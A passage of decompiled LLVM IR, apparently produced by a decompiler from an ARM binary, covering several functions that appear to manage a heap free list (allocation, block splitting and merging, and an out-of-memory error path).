  %v1_f9ac = and i32 %v1_f9a8, -4
  store i32 %v1_f9ac, i32* @r5, align 4
  %v9_f9b0 = icmp eq i32 %v1_f9ac, %v1_f998
  br i1 %v9_f9b0, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_f9a8
  %v3_f9b4 = sub i32 %v1_f9ac, %v1_f998
  store i32 %v3_f9b4, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_f9a8, %bb16
  %v1_f9b8 = xor i1 %v9_f9b0, true
  call void @__pseudo_cond_branch(i1 %v1_f9b8, i32 ptrtoint (i32* @global_var_10f2c.433 to i32))
  br label %dec_label_pc_f9bc

dec_label_pc_f9bc:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1ad10.432 to i32), i32* %r0.global-to-local, align 4
  store i32 63948, i32* @lr, align 4
  %v1_f9c8 = call i32 @function_10838()
  store i32 %v1_f9c8, i32* %r0.global-to-local, align 4
  %v0_f9cc = load i32, i32* @r5, align 4
  %v7_f9cc = icmp eq i32 %v0_f9cc, -1
  br i1 %v7_f9cc, label %dec_label_pc_fa28, label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f9bc
  store i32 ptrtoint (i32* @global_var_1aa90.423 to i32), i32* %r0.global-to-local, align 4
  %v1_f9e0 = call i32 @function_10838()
  %v0_f9e4 = load i32, i32* @r4, align 4
  %v0_f9e8 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_18234.427 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_f9e8, 16777216
  %v2_f9f0 = sdiv i32 %sext, 16777216
  %v5_f9f0 = call i32 @function_fc14(i32* bitcast (i32** @global_var_18234.427 to i32*), i32 %v2_f9f0, i32 %v0_f9e4)
  store i32 ptrtoint (i32** @global_var_18234.427 to i32), i32* %r0.global-to-local, align 4
  %v3_f9fc = call i32 @function_fb4c(i32* bitcast (i32** @global_var_18234.427 to i32*), i32 %v2_f910)
  store i32 %v3_f9fc, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1aa90.423 to i32), i32* %r0.global-to-local, align 4
  store i32 64016, i32* @lr, align 4
  %v1_fa0c = call i32 @function_10838()
  store i32 %v1_fa0c, i32* %r0.global-to-local, align 4
  %v2_fa10 = icmp eq i32 %v3_f9fc, 0
  br i1 %v2_fa10, label %dec_label_pc_fa28, label %dec_label_pc_fa18

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f924, %dec_label_pc_f9d4
  %v1_fa1c = phi i32 [ %v3_f948, %dec_label_pc_f924 ], [ %v3_f9fc, %dec_label_pc_f9d4 ]
  %v2_fa18 = load i32, i32* %stack_var_-20, align 4
  %v2_fa1c = inttoptr i32 %v1_fa1c to i32*
  store i32 %v2_fa18, i32* %v2_fa1c, align 4
  %v3_fa1c = load i32, i32* %r4.global-to-local, align 4
  %v4_fa1c = add i32 %v3_fa1c, 4
  store i32 %v4_fa1c, i32* %r4.global-to-local, align 4
  %v2_fa20 = icmp eq i32 %v4_fa1c, 0
  br i1 %v2_fa20, label %dec_label_pc_fa28, label %dec_label_pc_fa38

dec_label_pc_fa28:                                ; preds = %dec_label_pc_fa18, %dec_label_pc_f9d4, %dec_label_pc_f9bc, %dec_label_pc_f91c
  %v0_fa28 = call i32 @function_cc08()
  store i32 %v0_fa28, i32* %r0.global-to-local, align 4
  %v2_fa30 = inttoptr i32 %v0_fa28 to i32*
  store i32 12, i32* %v2_fa30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa18, %dec_label_pc_fa28
  %v0_fa38 = phi i32 [ %v4_fa1c, %dec_label_pc_fa18 ], [ 0, %dec_label_pc_fa28 ]
  store i32 %v0_fa38, i32* %r0.global-to-local, align 4
  store i32 %v3_f908, i32* @r4, align 4
  store i32 %v6_f908, i32* @r5, align 4
  store i32 %v9_f908, i32* @r6, align 4
  ret i32 %v0_fa38

; uselistorder directives
  uselistorder i32 %v0_fa38, { 1, 0 }
  uselistorder i32 %v3_f9fc, { 1, 0, 2 }
  uselistorder i32 %v1_f9ac, { 1, 0, 2 }
  uselistorder i32 %v1_f998, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v3_f948, { 1, 0, 2 }
  uselistorder i32 %v0_f90c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 2, 6, 8, 9, 10, 1, 12, 11, 19, 14, 13, 0, 15, 16, 17, 18, 3, 4 }
  uselistorder label %dec_label_pc_fa38, { 1, 0 }
  uselistorder label %dec_label_pc_fa18, { 1, 0 }
  uselistorder label %dec_label_pc_f9bc, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_f924, { 1, 0 }
}

define i32 @function_fa5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_fa5c:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_fa5c = icmp eq i32 %arg1, 0
  %v3_fa60 = load i32, i32* @r4, align 4
  store i32 %v3_fa60, i32* %stack_var_-24, align 4
  %v6_fa60 = load i32, i32* @r5, align 4
  %v9_fa60 = load i32, i32* @r6, align 4
  %v15_fa60 = load i32, i32* @r8, align 4
  br i1 %v2_fa5c, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_fa5c
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_fa5c
  %v1_fa68 = add i32 %arg1, -4
  %v2_fa68 = inttoptr i32 %v1_fa68 to i32*
  %v3_fa68 = load i32, i32* %v2_fa68, align 4
  store i32 %v3_fa68, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_18234.427 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_fa68, i32* @r4, align 4
  %v1_fa80 = call i32 @function_10838()
  %v0_fa84 = load i32, i32* @r4, align 4
  %v0_fa88 = load i32, i32* @r5, align 4
  %v4_fa90 = call i32 @function_fc14(i32* bitcast (i32** @global_var_18234.427 to i32*), i32 %v0_fa84, i32 %v0_fa88)
  %v1_fa98 = inttoptr i32 %v4_fa90 to i32*
  %v2_fa98 = load i32, i32* %v1_fa98, align 4
  store i32 %v2_fa98, i32* %r6.global-to-local, align 4
  %v2_fa9c = load i32, i32* @global_var_1aab8.430, align 4
  %v4_faa0 = mul i32 %v2_fa9c, 8
  %v6_faa0 = icmp ult i32 %v2_fa98, %v4_faa0
  store i32 %v4_fa90, i32* @r4, align 4
  br i1 %v6_faa0, label %dec_label_pc_fae0, label %dec_label_pc_faac

dec_label_pc_faac:                                ; preds = %bb11
  %v1_fab4 = call i32 @function_10838()
  %v1_fabc = call i32 @function_10f2c(i32 0)
  %v0_fac0 = load i32, i32* @r4, align 4
  %v1_fac0 = add i32 %v0_fac0, 12
  store i32 %v1_fac0, i32* @r5, align 4
  %v9_fac4 = icmp eq i32 %v1_fac0, %v1_fabc
  br i1 %v9_fac4, label %dec_label_pc_fae8, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_faac
  %v1_fad8 = call i32 @function_10838()
  br label %dec_label_pc_fae0

dec_label_pc_fae0:                                ; preds = %bb11, %dec_label_pc_facc, %bb14
  %v2_fae0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_fae0, i32* @r4, align 4
  store i32 %v6_fa60, i32* @r5, align 4
  store i32 %v9_fa60, i32* %r6.global-to-local, align 4
  store i32 %v15_fa60, i32* %r8.global-to-local, align 4
  %v0_fae4 = call i32 @function_10838()
  %v0_fae8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_faac, %dec_label_pc_fae0
  %v1_faf0 = phi i32 [ %v0_fac0, %dec_label_pc_faac ], [ %v0_fae8.pre, %dec_label_pc_fae0 ]
  %v1_fae8 = add i32 %v1_faf0, 4
  %v2_fae8 = inttoptr i32 %v1_fae8 to i32*
  %v3_fae8 = load i32, i32* %v2_fae8, align 4
  %v2_faec = icmp eq i32 %v3_fae8, 0
  br i1 %v2_faec, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_fae8
  %v2_faf0 = add i32 %v1_faf0, 8
  %v3_faf0 = inttoptr i32 %v2_faf0 to i32*
  %v4_faf0 = load i32, i32* %v3_faf0, align 4
  %v3_faf4 = add i32 %v3_fae8, 8
  %v4_faf4 = inttoptr i32 %v3_faf4 to i32*
  store i32 %v4_faf0, i32* %v4_faf4, align 4
  %v0_faf8.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fae8, %bb12
  %v0_faf8 = phi i32 [ %v1_faf0, %dec_label_pc_fae8 ], [ %v0_faf8.pre, %bb12 ]
  %v1_faf8 = add i32 %v0_faf8, 8
  %v2_faf8 = inttoptr i32 %v1_faf8 to i32*
  %v3_faf8 = load i32, i32* %v2_faf8, align 4
  %v1_fafc = add i32 %v0_faf8, 4
  %v2_fafc = inttoptr i32 %v1_fafc to i32*
  %v3_fafc = load i32, i32* %v2_fafc, align 4
  %v2_fb00 = icmp eq i32 %v3_faf8, 0
  br i1 %v2_fb00, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_fb04 = add i32 %v3_faf8, 4
  %v4_fb04 = inttoptr i32 %v3_fb04 to i32*
  store i32 %v3_fafc, i32* %v4_fb04, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_fb08 = load i32, i32* %r8.global-to-local, align 4
  %v3_fb08 = inttoptr i32 %v2_fb08 to i32*
  store i32 %v3_fafc, i32* %v3_fb08, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_fb18 = call i32 @function_10838()
  %v0_fb1c = load i32, i32* %r6.global-to-local, align 4
  %v1_fb1c = load i32, i32* @r4, align 4
  %v0_fb24 = load i32, i32* @r5, align 4
  %v2_fb1c = sub i32 12, %v0_fb1c
  %v1_fb20 = add i32 %v2_fb1c, %v1_fb1c
  %v2_fb24 = sub i32 %v1_fb20, %v0_fb24
  %v1_fb28 = call i32 @function_10f2c(i32 %v2_fb24)
  br label %dec_label_pc_fae0

; uselistorder directives
  uselistorder i32 %v0_faf8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_10f2c, { 2, 1, 0 }
  uselistorder i32** @global_var_18234.427, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fae8, { 1, 0 }
  uselistorder label %dec_label_pc_fae0, { 2, 1, 0 }
}

define i32 @function_fb4c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fb4c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_fb4c = inttoptr i32 %arg2 to i32*
  %v2_fb4c = load i32, i32* %v1_fb4c, align 4
  %v3_fb50 = load i32, i32* @r4, align 4
  store i32 %v3_fb50, i32* %stack_var_-8, align 4
  %v1_fb54 = add i32 %v2_fb4c, 3
  %v1_fb58 = and i32 %v1_fb54, -4
  store i32 %v1_fb58, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_fb60 = icmp ugt i32 %v1_fb58, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_fb68 = load i32, i32* %arg1, align 4
  store i32 %v2_fb68, i32* %r0.global-to-local, align 4
  br i1 %v2_fb60, label %dec_label_pc_fbd4.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_fb4c
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fbd4.preheader

dec_label_pc_fbd4.preheader:                      ; preds = %dec_label_pc_fb4c, %bb
  %v1_fb88 = phi i32 [ %v1_fb58, %dec_label_pc_fb4c ], [ 12, %bb ]
  %v2_fbd49 = icmp eq i32 %v2_fb68, 0
  br i1 %v2_fbd49, label %dec_label_pc_fbdc, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fbd4.preheader, %dec_label_pc_fbd0
  %v2_fb8c = phi i32 [ %v3_fbd0, %dec_label_pc_fbd0 ], [ %v2_fb68, %dec_label_pc_fbd4.preheader ]
  %v1_fb74 = inttoptr i32 %v2_fb8c to i32*
  %v2_fb74 = load i32, i32* %v1_fb74, align 4
  store i32 %v2_fb74, i32* @ip, align 4
  %v3_fb78 = icmp ult i32 %v2_fb74, %v1_fb88
  br i1 %v3_fb78, label %dec_label_pc_fbd0, label %dec_label_pc_fb80

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb74
  %v1_fb80 = add i32 %v1_fb88, 44
  %v3_fb84 = icmp ult i32 %v2_fb74, %v1_fb80
  br i1 %v3_fb84, label %dec_label_pc_fb94, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_fb80
  %v2_fb78.le = sub i32 %v2_fb74, %v1_fb88
  store i32 %v2_fb78.le, i32* %v1_fb74, align 4
  %v0_fbc0.pre = load i32, i32* @ip, align 4
  %v0_fbc8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb80
  %v1_fb94 = add i32 %v2_fb8c, 4
  %v2_fb94 = inttoptr i32 %v1_fb94 to i32*
  %v3_fb94 = load i32, i32* %v2_fb94, align 4
  store i32 %v3_fb94, i32* %r2.global-to-local, align 4
  %v2_fb98 = icmp eq i32 %v3_fb94, 0
  br i1 %v2_fb98, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_fb94
  %v2_fb9c = add i32 %v2_fb8c, 8
  %v3_fb9c = inttoptr i32 %v2_fb9c to i32*
  %v4_fb9c = load i32, i32* %v3_fb9c, align 4
  %v3_fba0 = add i32 %v3_fb94, 8
  %v4_fba0 = inttoptr i32 %v3_fba0 to i32*
  store i32 %v4_fb9c, i32* %v4_fba0, align 4
  %v0_fba4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_fb94, %bb27
  %v0_fba4 = phi i32 [ %v2_fb8c, %dec_label_pc_fb94 ], [ %v0_fba4.pre, %bb27 ]
  %v1_fba4 = add i32 %v0_fba4, 8
  %v2_fba4 = inttoptr i32 %v1_fba4 to i32*
  %v3_fba4 = load i32, i32* %v2_fba4, align 4
  %v1_fba8 = add i32 %v0_fba4, 4
  %v2_fba8 = inttoptr i32 %v1_fba8 to i32*
  %v3_fba8 = load i32, i32* %v2_fba8, align 4
  %v2_fbac = icmp eq i32 %v3_fba4, 0
  br i1 %v2_fbac, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_fbb0 = add i32 %v3_fba4, 4
  %v4_fbb0 = inttoptr i32 %v3_fbb0 to i32*
  store i32 %v3_fba8, i32* %v4_fbb0, align 4
  %v1_fbb8 = load i32, i32* @ip, align 4
  store i32 %v1_fbb8, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_fbb4 = load i32, i32* %r1.global-to-local, align 4
  %v3_fbb4 = inttoptr i32 %v2_fbb4 to i32*
  store i32 %v3_fba8, i32* %v3_fbb4, align 4
  %v1_fbbc.pre = load i32, i32* @ip, align 4
  store i32 %v1_fbbc.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_fbc8 = phi i32 [ %v0_fbc8.pre, %.thread._crit_edge ], [ %v1_fbb8, %bb28 ], [ %v1_fbbc.pre, %.thread5 ]
  %v0_fbc0 = phi i32 [ %v0_fbc0.pre, %.thread._crit_edge ], [ %v1_fbb8, %bb28 ], [ %v1_fbbc.pre, %.thread5 ]
  %v1_fbc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_fbc0 = sub i32 %v1_fbc0, %v0_fbc0
  %v1_fbc4 = add i32 %v2_fbc0, 12
  store i32 %v1_fbc4, i32* %r0.global-to-local, align 4
  %v1_fbc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_fbc8 = inttoptr i32 %v1_fbc8 to i32*
  store i32 %v0_fbc8, i32* %v2_fbc8, align 4
  %v2_fbcc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fbcc, i32* %r4.global-to-local, align 4
  ret i32 %v1_fbc4

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fb74
  %v1_fbd0 = add i32 %v2_fb8c, 4
  %v2_fbd0 = inttoptr i32 %v1_fbd0 to i32*
  %v3_fbd0 = load i32, i32* %v2_fbd0, align 4
  store i32 %v3_fbd0, i32* %r0.global-to-local, align 4
  %v2_fbd4 = icmp eq i32 %v3_fbd0, 0
  br i1 %v2_fbd4, label %dec_label_pc_fbd4.dec_label_pc_fbdc_crit_edge, label %dec_label_pc_fb74

dec_label_pc_fbd4.dec_label_pc_fbdc_crit_edge:    ; preds = %dec_label_pc_fbd0
  br label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbd4.dec_label_pc_fbdc_crit_edge, %dec_label_pc_fbd4.preheader
  store i32 %v3_fb50, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_fbd0, { 1, 2, 0 }
  uselistorder i32 %v0_fba4, { 1, 0 }
  uselistorder i32 %v2_fb74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fb8c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_fb88, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_fb74, { 1, 0 }
  uselistorder label %dec_label_pc_fbd4.preheader, { 1, 0 }
}

define i32 @function_fbe0() local_unnamed_addr {
dec_label_pc_fbe0:
  %v0_fbe0 = load i32, i32* @r2, align 4
  %v2_fbe0 = icmp eq i32 %v0_fbe0, 0
  %v0_fbe4 = load i32, i32* @r3, align 4
  %v1_fbe4 = load i32, i32* @r1, align 4
  %v2_fbe4 = add i32 %v1_fbe4, 4
  %v3_fbe4 = inttoptr i32 %v2_fbe4 to i32*
  store i32 %v0_fbe4, i32* %v3_fbe4, align 4
  %v0_fbe8 = load i32, i32* @r2, align 4
  %v1_fbe8 = load i32, i32* @r1, align 4
  %v2_fbe8 = add i32 %v1_fbe8, 8
  %v3_fbe8 = inttoptr i32 %v2_fbe8 to i32*
  store i32 %v0_fbe8, i32* %v3_fbe8, align 4
  %v1_fbf0 = load i32, i32* @r1, align 4
  br i1 %v2_fbe0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_fbe0
  %v2_fbec = load i32, i32* @r2, align 4
  %v3_fbec = add i32 %v2_fbec, 4
  %v4_fbec = inttoptr i32 %v3_fbec to i32*
  store i32 %v1_fbf0, i32* %v4_fbec, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_fbe0
  %v2_fbf0 = load i32, i32* @r0, align 4
  %v3_fbf0 = inttoptr i32 %v2_fbf0 to i32*
  store i32 %v1_fbf0, i32* %v3_fbf0, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_fbf4 = load i32, i32* @r3, align 4
  %v2_fbf4 = icmp eq i32 %v0_fbf4, 0
  br i1 %v2_fbf4, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_fbf8 = load i32, i32* @r1, align 4
  %v3_fbf8 = add i32 %v0_fbf4, 8
  %v4_fbf8 = inttoptr i32 %v3_fbf8 to i32*
  store i32 %v1_fbf8, i32* %v4_fbf8, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_fbfc = load i32, i32* @r0, align 4
  ret i32 %v1_fbfc

; uselistorder directives
  uselistorder i32 %v1_fbf0, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_fc00() local_unnamed_addr {
dec_label_pc_fc00:
  %v0_fc00 = load i32, i32* @r2, align 4
  %v2_fc00 = icmp eq i32 %v0_fc00, 0
  %v1_fc04 = load i32, i32* @r1, align 4
  br i1 %v2_fc00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_fc00
  %v2_fc04 = load i32, i32* @r0, align 4
  %v3_fc04 = inttoptr i32 %v2_fc04 to i32*
  store i32 %v1_fc04, i32* %v3_fc04, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_fc00
  %v3_fc08 = add i32 %v0_fc00, 4
  %v4_fc08 = inttoptr i32 %v3_fc08 to i32*
  store i32 %v1_fc04, i32* %v4_fc08, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_fc0c = load i32, i32* @r2, align 4
  %v1_fc0c = load i32, i32* @r1, align 4
  %v2_fc0c = add i32 %v1_fc0c, 8
  %v3_fc0c = inttoptr i32 %v2_fc0c to i32*
  store i32 %v0_fc0c, i32* %v3_fc0c, align 4
  %v1_fc10 = load i32, i32* @r0, align 4
  ret i32 %v1_fc10

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_fc14(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fc14:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_fc14 = load i32, i32* @r4, align 4
  store i32 %v3_fc14, i32* %stack_var_-20, align 4
  %v2_fc18 = load i32, i32* %arg1, align 4
  store i32 %v2_fc18, i32* %r4.global-to-local, align 4
  %v2_fc1c = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_fc382 = icmp eq i32 %v2_fc18, 0
  br i1 %v2_fc382, label %dec_label_pc_fce8, label %dec_label_pc_fc28

dec_label_pc_fc28:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fc30
  %v0_fc78 = phi i32 [ %v0_fc80, %dec_label_pc_fc30 ], [ 0, %dec_label_pc_fc14 ]
  %v0_fc80 = phi i32 [ %v3_fc34, %dec_label_pc_fc30 ], [ %v2_fc18, %dec_label_pc_fc14 ]
  %v1_fc3c5.in = phi i32 [ %v3_fc34, %dec_label_pc_fc30 ], [ %v2_fc18, %dec_label_pc_fc14 ]
  %v1_fc3c5 = add i32 %v1_fc3c5.in, 12
  %v3_fc28 = icmp ult i32 %v1_fc3c5, %arg2
  br i1 %v3_fc28, label %dec_label_pc_fc30, label %dec_label_pc_fc48

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fc28
  store i32 %v0_fc80, i32* %r6.global-to-local, align 4
  %v1_fc34 = add i32 %v0_fc80, 4
  %v2_fc34 = inttoptr i32 %v1_fc34 to i32*
  %v3_fc34 = load i32, i32* %v2_fc34, align 4
  store i32 %v3_fc34, i32* %r4.global-to-local, align 4
  %v2_fc38 = icmp eq i32 %v3_fc34, 0
  br i1 %v2_fc38, label %dec_label_pc_fc38.dec_label_pc_fce8.loopexit_crit_edge, label %dec_label_pc_fc28

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fc28
  %v1_fc48 = inttoptr i32 %v0_fc80 to i32*
  %v2_fc48 = load i32, i32* %v1_fc48, align 4
  store i32 %v2_fc48, i32* @ip, align 4
  %v2_fc4c = sub i32 %v0_fc80, %v2_fc48
  %v1_fc50 = add i32 %v2_fc4c, 12
  %v3_fc54 = icmp uge i32 %v1_fc50, %v2_fc1c
  %v9_fc54 = icmp eq i32 %v1_fc50, %v2_fc1c
  %v2_fc58 = xor i1 %v9_fc54, true
  %v3_fc58 = and i1 %v3_fc54, %v2_fc58
  br i1 %v3_fc58, label %dec_label_pc_fce8, label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc48
  %v2_fc5c = add i32 %v2_fc48, %arg3
  store i32 %v2_fc5c, i32* %r7.global-to-local, align 4
  br i1 %v9_fc54, label %dec_label_pc_fc64, label %dec_label_pc_fc90

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc5c
  %v2_fc64 = icmp eq i32 %v0_fc78, 0
  br i1 %v2_fc64, label %dec_label_pc_fcdc, label %dec_label_pc_fc6c

dec_label_pc_fc6c:                                ; preds = %dec_label_pc_fc64
  %v1_fc6c = add i32 %v0_fc78, 12
  %v9_fc70 = icmp eq i32 %v1_fc6c, %arg2
  br i1 %v9_fc70, label %dec_label_pc_fc78, label %dec_label_pc_fcdc

dec_label_pc_fc78:                                ; preds = %dec_label_pc_fc6c
  %v1_fc78 = inttoptr i32 %v0_fc78 to i32*
  %v2_fc78 = load i32, i32* %v1_fc78, align 4
  %v1_fc7c = add i32 %v0_fc78, 8
  %v2_fc7c = inttoptr i32 %v1_fc7c to i32*
  %v3_fc7c = load i32, i32* %v2_fc7c, align 4
  store i32 %v3_fc7c, i32* @r2, align 4
  store i32 %v0_fc80, i32* @r1, align 4
  %v2_fc84 = add i32 %v2_fc78, %v2_fc5c
  store i32 %v2_fc84, i32* %r7.global-to-local, align 4
  %v0_fc88 = call i32 @function_fc00()
  br label %dec_label_pc_fcdc

dec_label_pc_fc90:                                ; preds = %dec_label_pc_fc5c
  %v1_fc90 = add i32 %v0_fc80, 4
  %v2_fc90 = inttoptr i32 %v1_fc90 to i32*
  %v3_fc90 = load i32, i32* %v2_fc90, align 4
  store i32 %v3_fc90, i32* %r5.global-to-local, align 4
  %v2_fc94 = icmp eq i32 %v3_fc90, 0
  br i1 %v2_fc94, label %dec_label_pc_fcc8, label %dec_label_pc_fc9c

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_fc90
  %v1_fc9c = inttoptr i32 %v3_fc90 to i32*
  %v2_fc9c = load i32, i32* %v1_fc9c, align 4
  store i32 %v2_fc9c, i32* @ip, align 4
  %v2_fca0 = sub i32 %v3_fc90, %v2_fc9c
  %v1_fca4 = add i32 %v2_fca0, 12
  %v9_fca8 = icmp eq i32 %v2_fc1c, %v1_fca4
  br i1 %v9_fca8, label %dec_label_pc_fcb0, label %dec_label_pc_fcc8

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc9c
  store i32 %v0_fc78, i32* @r2, align 4
  store i32 %v3_fc90, i32* @r1, align 4
  %v2_fcb8 = add i32 %v2_fc9c, %v2_fc5c
  store i32 %v2_fcb8, i32* %r7.global-to-local, align 4
  %v0_fcbc = call i32 @function_fc00()
  %v0_fcc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_fcc0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fcdc

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_fc9c, %dec_label_pc_fc90
  %v2_fcc8 = add i32 %v0_fc80, %arg3
  store i32 %v2_fcc8, i32* %r4.global-to-local, align 4
  store i32 %v3_fc90, i32* @r3, align 4
  store i32 %v0_fc78, i32* @r2, align 4
  store i32 %v2_fcc8, i32* @r1, align 4
  %v0_fcd8 = call i32 @function_fbe0()
  br label %dec_label_pc_fcdc

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fc6c, %dec_label_pc_fc64, %dec_label_pc_fcb0, %dec_label_pc_fc78, %dec_label_pc_fcc8
  %v0_fcdc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fcdc, i32* %r5.global-to-local, align 4
  %v0_fce0 = load i32, i32* %r7.global-to-local, align 4
  %v2_fce0 = inttoptr i32 %v0_fcdc to i32*
  store i32 %v0_fce0, i32* %v2_fce0, align 4
  br label %dec_label_pc_fd00

dec_label_pc_fc38.dec_label_pc_fce8.loopexit_crit_edge: ; preds = %dec_label_pc_fc30
  br label %dec_label_pc_fce8

dec_label_pc_fce8:                                ; preds = %dec_label_pc_fc14, %dec_label_pc_fc38.dec_label_pc_fce8.loopexit_crit_edge, %dec_label_pc_fc48
  %v1_fce8 = add i32 %v2_fc1c, -12
  store i32 %v1_fce8, i32* %r5.global-to-local, align 4
  %v3_fcec = inttoptr i32 %v1_fce8 to i32*
  store i32 %arg3, i32* %v3_fcec, align 4
  %v0_fcf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fcf0, i32* @r3, align 4
  %v0_fcf4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_fcf4, i32* @r2, align 4
  %v0_fcf8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_fcf8, i32* @r1, align 4
  %v0_fcfc = call i32 @function_fbe0()
  br label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fcdc, %dec_label_pc_fce8
  %v0_fd00 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd04 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fd04, i32* @r4, align 4
  ret i32 %v0_fd00

; uselistorder directives
